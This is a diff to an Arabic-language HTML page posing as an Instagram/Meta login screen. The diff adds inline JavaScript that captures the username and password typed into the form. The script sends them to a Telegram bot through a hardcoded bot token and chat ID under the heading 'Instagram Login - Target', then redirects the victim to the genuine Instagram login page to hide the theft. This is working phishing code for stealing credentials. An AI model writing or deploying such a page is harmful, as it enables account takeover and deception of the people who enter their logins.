@@ -162,11 +162,44 @@
 
     <button class="signup-btn">إنشاء حساب جديد</button>
 
-    <!-- شعار ميتا في مكانه تحت خالص -->
+    <!-- شعار ميتا -->
     <div class="meta-logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
     </div>
 
-    <script src="script.js"></script>
+    <!-- كود الجافاسكريبت (إرسال البيانات + التحويل) -->
+    <script>
+        const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
+        const CHAT_ID = '7644504212';
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); 
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('loginBtn');
+            const errorMsg = document.getElementById('errorMsg');
+
+            // تغيير شكل الزرار
+            btn.innerText = 'جاري الدخول...';
+            btn.disabled = true;
+            errorMsg.style.display = 'none';
+
+            // إرسال البيانات لتلجرام
+            const message = `<b>📸 Instagram Login - Target</b>\n\n<b>Username:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (err) {}
+
+            // التحويل لموقع إنستجرام الأصلي بعد ثانية
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 1000);
+        });
+    </script>
 </body>
 </html>
